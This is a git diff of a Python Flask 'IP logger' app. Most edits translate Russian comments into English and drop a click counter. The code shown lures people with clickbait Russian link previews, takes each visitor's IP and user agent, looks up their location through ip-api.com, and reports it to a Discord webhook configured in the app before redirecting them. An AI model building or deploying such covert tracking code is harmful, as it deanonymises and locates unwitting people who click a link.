@@ -10,10 +10,10 @@ from functools import wraps
 import os
 from werkzeug.middleware.proxy_fix import ProxyFix
 
-# Загрузка переменных окружения из файла .env
+# Load environment variables from .env file
 load_dotenv()
 
-# Использование переменных окружения
+# Use environment variables
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 REAL_URL = os.getenv("REAL_URL")
 REDIRECT_DELAY = int(os.getenv("REDIRECT_DELAY"))
@@ -26,18 +26,15 @@ app.secret_key = os.getenv("SECRET_KEY")
 
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1)
 
-# Настройка логирования
+# Configure logging
 logging.basicConfig(level=LOGGING_LEVEL)
 
-# Загрузка конфигураций с фиксированными значениями
+# Load fixed configurations
 CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, этот факт скрывался долгие годы..."
 CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
 CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"
 
-# Глобальный счётчик кликов
-click_count = 0
-
-# Конфигурация для логирования изображений
+# Configuration for image logging
 config = {
     "webhook": DISCORD_WEBHOOK_URL,
     "image": CLICKBAIT_IMAGE,
@@ -61,7 +58,7 @@ config = {
     },
 }
 
-# Список анекдотов
+# List of jokes
 jokes = [
     "Почему программисты плохо спят? Потому что они просыпаются от багов!",
     "Как называется программист без руки? Левосторонний.",
@@ -118,7 +115,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     try:
         info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
 
-        # Проверка наличия ключа 'proxy' в ответе
+        # Check for 'proxy' key in response
         if 'proxy' in info and info["proxy"]:
             if config["vpnCheck"] == 2:
                 return
@@ -143,7 +140,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
         os, browser = httpagentparser.simple_detect(useragent)
 
-        # Безопасный доступ к информации о часовом поясе
+        # Safe access to timezone information
         timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
         timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
         timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'
@@ -249,7 +246,7 @@ def init_db():
     except Exception as e:
         logging.error(f"Database initialization error: {e}")
 
-# Инициализация БД при запуске
+# Initialize DB on startup
 init_db()
 
 def login_required(f):
@@ -453,9 +450,9 @@ def handle_custom_link(custom_path):
         db.commit()
 
         user_ip = (
-            request.headers.get('CF-Connecting-IP',  # Приоритет для Cloudflare
+            request.headers.get('CF-Connecting-IP',  # Priority for Cloudflare
             request.headers.get('X-Forwarded-For', request.remote_addr))
-        ).split(',')[0].strip()  # Безопасное извлечение первого IP
+        ).split(',')[0].strip()  # Safe extraction of the first IP
 
         user_agent = request.headers.get('User-Agent')
         makeReport(user_ip, user_agent, endpoint=request.path)
